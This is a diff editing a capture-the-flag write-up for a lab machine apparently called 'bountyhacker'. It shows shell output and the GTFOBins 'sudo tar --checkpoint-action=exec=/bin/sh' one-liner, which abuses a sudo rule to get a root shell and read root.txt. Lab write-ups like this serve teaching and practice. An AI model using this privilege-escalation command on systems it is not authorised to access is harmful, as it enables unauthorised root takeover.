@@ -114,12 +114,10 @@ Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)
 83 packages can be updated.
 0 updates are security updates.
 
-Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
 lin@bountyhacker:~/Desktop$ ls
 user.txt
 lin@bountyhacker:~/Desktop$ cat user.txt
 [DATA EXPUNGED]
-lin@bountyhacker:~/Desktop$
 
 ```
 
@@ -133,18 +131,16 @@ Matching Defaults entries for lin on bountyhacker:
 
 User lin may run the following commands on bountyhacker:
     (root) /bin/tar
-lin@bountyhacker:~/Desktop$
+
 ```
 
-As we can see, lin can run /bin/tar as root. Lets head over to [https://gtfobins.github.io/](https://gtfobins.github.io/) and look for an exploit for this binary that can help us break out and gain a root shell. On searching for tar on the site, we get the following command.
+As we can see, lin can run /bin/tar as root. Lets head over to [GTFOBins](https://gtfobins.github.io/) and look for an exploit for this binary that can help us break out and gain a root shell. On searching for tar on the site, we get the following command.
 
 ```bash
 sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ```
 
 Lets pop that into the shell and see what happens. Hmm, it seems we have successfully gained root access.
-
-![q89uenpzpn921.jpg](images/q89uenpzpn921.jpg)
 
 Now we use the find command to locate root.txt.
 
@@ -157,7 +153,6 @@ root
 /root/root.txt
 # cat /root/root.txt
 [DATA EXPUNGED]
-#
 
 ```
 
